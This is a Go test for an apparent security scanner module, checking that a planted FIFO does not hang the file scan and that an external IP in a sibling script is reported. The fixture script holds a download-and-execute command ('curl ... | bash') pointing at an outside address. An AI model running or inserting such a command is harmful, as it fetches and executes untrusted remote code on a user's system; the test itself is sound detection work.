//go:build linux

package modules

import (
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"
)

// A planted FIFO in a staging root must be skipped without hanging the scan,
// while a normal sibling file is still scanned.
func TestUnifiedFileScan_SkipsFIFOWithoutHanging(t *testing.T) {
	ctx := testDeepScanCtx(t)
	stagingRoot := t.TempDir()

	fifo := filepath.Join(stagingRoot, "trap")
	if err := syscall.Mkfifo(fifo, 0600); err != nil {
		t.Fatal(err)
	}
	normal := filepath.Join(stagingRoot, "real.sh")
	if err := os.WriteFile(normal, []byte("curl http://9.9.9.9/x.sh | bash"), 0644); err != nil {
		t.Fatal(err)
	}

	done := make(chan struct{})
	go func() {
		unifiedFileScanRoots(ctx, make(map[string][]string), make(map[string][]string), []string{stagingRoot})
		close(done)
	}()
	select {
	case <-done:
	case <-time.After(15 * time.Second):
		t.Fatal("scan hung on planted FIFO")
	}

	out, err := os.ReadFile(filepath.Join(ctx.Dirs.DeepScan, "01_external_ip_domain.txt"))
	if err != nil {
		t.Fatalf("section 01 output not created: %v", err)
	}
	if !strings.Contains(string(out), "9.9.9.9") {
		t.Error("want 9.9.9.9 from the normal sibling file")
	}
}
